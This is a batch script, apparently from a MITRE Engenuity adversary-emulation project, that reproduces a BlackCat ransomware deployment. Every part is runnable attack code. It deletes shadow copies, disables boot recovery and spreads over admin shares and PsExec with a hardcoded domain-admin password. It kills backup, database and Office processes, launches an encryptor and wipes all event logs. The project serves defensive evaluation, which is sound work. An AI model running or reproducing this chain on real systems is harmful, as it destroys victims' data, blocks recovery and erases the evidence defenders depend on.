:: ---------------------------------------------------------------------------
:: digirevenge.bat - Alternative batch script with an encryption executable if execution of BlackCat (Windows) binary fails

:: Copyright 2024 MITRE Engenuity. Approved for public release. Document number CT0005.
:: Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

:: http://www.apache.org/licenses/LICENSE-2.0

:: Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

:: This project makes use of ATT&CK®
:: ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 
 
:: Usage: .\digirevenge.bat path_to_encryption_executable
 
:: Revision History:
 
:: --------------------------------------------------------------------------- 
ECHO off

IF "%~1" == "" GOTO usage
set enc_binary_path=%1
set targets=%~2

:: Recovery hampering
ECHO [INFO] Deleting shadow copies
vssadmin.exe delete shadows /all /quiet || ECHO [ERROR] Failed to delete shadow copies
ECHO:

ECHO [INFO] Disabling bootloader recovery
bcdedit /set {default} recoveryenabled no || ECHO [ERROR] Failed to disable bootloader recovery
ECHO:

:: System/user discovery
ECHO [INFO] Determining system UUID
wmic csproduct get UUID || ECHO [ERROR] Failed to get system UUID
ECHO:

ECHO [INFO] Current user:
whoami || ECHO [ERROR] Failed to get current username
ECHO:

ECHO [INFO] Current hostname:
hostname || ECHO [ERROR] Failed to get current hostname
ECHO:

:: Enable remote-to-local and remote-to-remote symbolic link evaluation
ECHO [INFO] Enabling remote-to-local symbolic link evaluation
fsutil behavior set SymlinkEvaluation R2L:1 || ECHO [ERROR] Failed to enable remote-to-local symbolic link evaluation
ECHO:

ECHO [INFO] Enabling remote-to-remote symbolic link evaluation
fsutil behavior set SymlinkEvaluation R2R:1 || ECHO [ERROR] Failed to enable remote-to-remote symbolic link evaluation
ECHO:

:: Empty recycle bin
ECHO [INFO] Emptying recycle bin
rd /q /s %SYSTEMDRIVE%\$Recycle.bin || ECHO [ERROR] Failed to empty recycle bin
ECHO:

:: Propagate via PsExec
if NOT "%~2" == "" (
    ECHO [INFO] Setting up propagation to %targets%
    ECHO:
    ECHO [INFO] Updating MaxMpxCt registry key value
    reg.exe add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f || ECHO [ERROR] Failed to set MaxMpxCt registry key value
    ECHO:

    for %%a in ("%targets:,=" "%") do (
        ECHO [INFO] Copying encryption binary to %%~a
        net use \\%%~a\C$\Windows /user:digirevenge\evals_domain_admin "axi9eengei9inaeR@" || ECHO [ERROR] Failed to mount \\%%~a\C$\Windows
        copy /y /b %enc_binary_path% \\%%~a\C$\Windows\digirevenge_a.exe || ECHO [ERROR] Failed to copy %enc_binary_path% to \\%%~a\C$\Windows\
        net use \\%%~a\C$\Windows /d || ECHO [ERROR] Failed to unmount \\%%~a\C$\Windows
    )

    ECHO [INFO] Performing PsExec propagation against %targets%
    PsExec64.exe -accepteula \\%targets% -u "digirevenge\evals_domain_admin" -p "axi9eengei9inaeR@" -s -d -f -c "%0" "C:\Windows\digirevenge_a.exe"
) ELSE (
    ECHO [INFO] Skipping PsExec propagation
)
ECHO:

:: Kill processes and terminate services to prepare for encryption
ECHO [INFO] Killing processes to prepare for encryption
set processes="msedge" "encsvc" "mydesktopqos" "xfssvccon" "firefox" "infopath" "winword" "steam" "synctime" "notepad" "ocomm" "onenote" "mspub" "thunderbird" "agntsvc" "sql" "excel" "powerpnt" "outlook" "wordpad" "isqlplussvc" "sqbcoreservice" "oracle" "ocautoupds" "dbsnmp" "msaccess" "tbirdconfig" "ocssd" "mydesktopservice" "visio" "mepocs" "memtas" "veeam" "backup" "sql" "vss" "msexchange"
for %%p in (%processes%) do ( 
   taskkill /f /im %%p.exe
)
ECHO: 

ECHO [INFO] Terminating services to prepare for encryption
set services="BDESVC" "MSSQLSERVER" "SDRSVC" "VSS" "wuauserv"
for %%s in (%services%) do ( 
   sc.exe stop %%s
)
ECHO: 

:: Run the encryption executable
ECHO [INFO] Running the encryption routine %1:
%1 --access-token 15742aa362a84ba3
ECHO:

:: Delete shadow copies again
ECHO [INFO] Deleting shadow copies again
vssadmin.exe delete shadows /all /quiet || ECHO [ERROR] Failed to delete shadow copies again
ECHO:

:: Clear event logs
ECHO [INFO] Clearing Windows event logs
FOR /F "tokens=*" %%e IN ('wevtutil.exe el') DO (
    wevtutil.exe cl "%%e" & ECHO [DEBUG] Cleared event log "%%e"
)
ECHO:

EXIT /B

:usage
ECHO Usage: digirevenge.bat path_to_encryption_executable [target1,target2,target,...]
ECHO first parameter: path to minimal encryption executable
ECHO second parameter: optional, quoted comma-separated list of remote targets. Do not include spaces
ECHO example: digirevenge.bat C:\Users\Public\enc.exe "target1,target2,target3"
ECHO example: digirevenge.bat C:\Users\Public\enc.exe
EXIT /B 1
